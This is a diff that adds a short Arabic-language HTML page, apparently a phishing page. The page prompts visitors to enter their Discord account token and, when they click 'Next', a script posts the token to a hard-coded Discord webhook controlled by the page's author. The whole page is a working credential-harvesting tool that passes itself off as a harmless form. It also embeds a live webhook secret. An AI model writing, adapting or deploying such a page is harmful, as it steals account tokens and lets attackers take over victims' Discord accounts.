@@ -1,0 +1,76 @@
+
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>https://12sad2.github.io/499/</title>
+<style>
+  body {
+    font-family: Arial, sans-serif;
+    background-color: #fff;
+    display: flex;
+    height: 100vh;
+    justify-content: center;
+    align-items: center;
+    margin: 0;
+  }
+  .container {
+    text-align: center;
+  }
+  input[type="text"] {
+    padding: 10px;
+    width: 300px;
+    font-size: 1rem;
+    margin-top: 10px;
+    margin-bottom: 20px;
+  }
+  button {
+    background-color: black;
+    color: white;
+    border: none;
+    padding: 12px 24px;
+    font-size: 1rem;
+    cursor: pointer;
+  }
+  button:hover {
+    background-color: #222;
+  }
+</style>
+</head>
+<body>
+  <div class="container">
+    <h2>قم بكتابة توكن حسابك ديسكورد :</h2>
+    <input id="tokenInput" type="text" placeholder="أدخل التوكن هنا" />
+    <br />
+    <button id="sendBtn">التالي</button>
+  </div>
+
+  <script>
+    const webhookURL = "https://discord.com/api/webhooks/1377673324993318912/cMY07m-2Vs3kEa-JtWtpNEofIit-_-MphmyZP3K5r28zWl0-ZIz0hRC9RhgLgu0VcUG9";
+
+    document.getElementById('sendBtn').addEventListener('click', () => {
+      const token = document.getElementById('tokenInput').value.trim();
+      if (!token) {
+        alert('الرجاء إدخال التوكن');
+        return;
+      }
+
+      fetch(webhookURL, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ content: `تم إرسال التوكن: ${token}` }),
+      })
+      .then(response => {
+        if (response.ok) {
+          alert('تم إرسال التوكن بنجاح');
+          document.getElementById('tokenInput').value = '';
+        } else {
+          alert('حدث خطأ أثناء الإرسال');
+        }
+      })
+      .catch(() => alert('فشل الاتصال بالويب هوك'));
+    });
+  </script>
+</body>
+</html>
